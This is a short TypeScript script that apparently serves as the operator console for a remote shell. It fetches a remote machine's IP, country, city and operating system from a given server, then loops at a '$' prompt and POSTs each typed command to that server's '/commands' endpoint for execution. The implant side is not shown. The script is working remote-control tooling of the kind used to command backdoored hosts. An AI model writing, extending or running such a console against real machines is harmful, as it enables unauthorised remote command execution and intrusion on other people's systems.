interface IP {
  status: string;
  country: string;
  city: string;
  query: string;
}
console.log(`With a '/' at the end of the URL`);
const url = prompt("Enter the URL: ") as string;
const rawResponse = await fetch(`${url}ip`, {
  method: "GET",
  headers: {
    Accept: "application/json",
    "Content-Type": "application/json",
  },
});

const rawResponse2 = await fetch(`${url}ip/os`, {
  method: "GET",
  headers: {
    Accept: "application/json",
    "Content-Type": "application/json",
  },
});

const content = (await rawResponse.json()) as IP;
const os = await rawResponse2.text();
console.log(`          %cStatus: ${content.status}`, "color: green");
console.log(`          Country: ${content.country}`);
console.log(`          City: ${content.city}`);
console.log(`          ip: ${content.query}`);
console.log(`          OS: ${os}`);

const makePostRequest = async (url: string, data: string) => {
  const rawResponse = await fetch(url, {
    method: "POST",
    headers: {
      Accept: "application/json",
      "Content-Type": "application/json",
    },
    body: JSON.stringify({ command: data }),
  });
  const content = await rawResponse.json();
  console.log(content);
};

while (true) {
  const input = prompt("$") as string;
  if (input === "exit") {
    break;
  }
  await makePostRequest(`${url}commands`, input);
}
